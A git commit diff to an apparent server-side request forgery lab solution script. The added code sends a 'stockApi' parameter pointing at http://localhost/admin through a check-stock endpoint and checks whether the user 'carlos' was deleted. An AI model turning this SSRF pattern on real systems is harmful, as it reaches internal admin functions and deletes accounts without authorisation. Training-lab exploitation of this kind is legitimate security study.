d229688d3d398129b60ac43d557fc7f0a9f3c781
Jozenartes <jozenarts12@gmail.com>
2025-05-22 13:06:08 +0100

    check if user deleted statements

--- SSRF-lab-01.py
+++ SSRF-lab-01.py
@@ -11,10 +11,19 @@ def delete_user(url):
     params = {'stockApi': delete_user_url_ssrf_payload}
     r = requests.post(url + check_stock_path, data=params, verify=False, proxies=proxies)
 
+    #Check if user was deleted
+    admin_ssrf_payload = 'http://localhost/admin'
+    params2= {'stockApi': admin_ssrf_payload}
+    r = requests.post(url + check_stock_path, data=params2, verify=False, proxies=proxies)
+    if 'User delelted successfuly' in r.text:
+        print("(+) Successlfy deleted carlos user!")
+    else:
+        print("(-) Exploit was unsuccessful")
 
-#function that checks if the site set correclty. It requires the program to be run by adding the python version, python file and the url.
-#Example: python lab-01.py www.example.com
 def main():
+    #function that checks if the site set correclty. It requires the program to be run by adding the python version, python file and the url.
+    #Example: python lab-01.py www.example.com
+
     if len(sys.argv) != 2:
         print("(+) Usage: %s <url>" % sys.argv[0])
         print("(+) Example: %s www.example.com" % sys.argv[0])
